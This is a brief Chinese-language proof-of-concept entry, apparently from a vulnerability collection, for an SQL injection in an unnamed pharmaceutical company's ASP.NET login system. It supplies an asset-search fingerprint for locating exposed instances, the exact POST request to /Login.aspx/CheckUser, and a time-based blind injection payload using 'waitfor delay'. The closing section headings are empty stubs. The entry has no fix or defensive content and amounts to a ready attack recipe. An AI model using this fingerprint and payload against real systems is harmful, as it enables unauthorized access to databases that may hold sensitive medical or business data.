# 医药公司登录系统存在SQL注入漏洞

- **系统**：医药公司登录系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="ResourceScripts/zh-cn-Login.aspx.js"`
- **请求**：`POST /Login.aspx/CheckUser HTTP/1.1`
- **关键头**：`Host: 127.0.0.1`　`X-Requested-With: XMLHttpRequest`　`Content-Type: application/json; charset=utf-8`　`Priority: u=1`

**请求体 / payload**
```
{"value":"' waitfor delay '0:0:5'--+"}
```

**其他**
- 医药公司登录系统存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 医药公司登录系统